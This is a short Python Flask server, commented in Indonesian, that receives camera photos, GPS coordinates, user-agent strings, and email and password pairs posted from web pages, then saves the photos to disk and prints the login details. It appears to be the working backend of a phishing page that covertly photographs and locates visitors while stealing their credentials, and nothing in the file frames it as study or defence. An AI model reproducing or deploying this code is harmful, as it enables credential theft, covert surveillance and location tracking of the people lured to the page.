from flask import Flask, render_template, request
import os, base64

app = Flask(__name__)
CAPTURE_DIR = "captured_images"
os.makedirs(CAPTURE_DIR, exist_ok=True)

@app.route('/')
def index():
    return render_template("index.html")

# Terima foto awal
@app.route('/berhasil_awal', methods=['POST'])
def berhasil_awal():
    data = request.get_json()
    if data and "photo" in data:
        save_photo(data["photo"], "awal")
    print("\n[DATA AWAL]")
    print("Lokasi awal:", data.get("lat"), data.get("lon"))
    print("User-Agent awal:", data.get("ua"))
    return "OK"

# Terima foto login + form index
@app.route('/berhasil', methods=['POST'])
def berhasil():
    photo = request.form.get("photo")
    email = request.form.get("email")
    password = request.form.get("password")
    lat = request.form.get("lat")
    lon = request.form.get("lon")
    ua = request.form.get("ua")
    if photo:
        save_photo(photo, "login")
    print("\n[DATA LOGIN]")
    print("Email:", email)
    print("Password:", password)
    print("Lokasi login:", lat, lon)
    print("User-Agent login:", ua)
    return "OK"

@app.route('/form_laporan')
def form_laporan():
    return render_template("indanout.html")

def save_photo(photo_data, label):
    try:
        header, encoded = photo_data.split(",", 1)
        data = base64.b64decode(encoded)
        filename = f"{label}_{len(os.listdir(CAPTURE_DIR))+1}.jpg"
        path = os.path.join(CAPTURE_DIR, filename)
        with open(path, "wb") as f:
            f.write(data)
        print(f"Foto disimpan: {path}")
    except Exception as e:
        print("Gagal simpan foto:", e)

if __name__ == '__main__':
    port = int(os.environ.get("PORT", 5000))
    app.run(host='0.0.0.0', port=port)
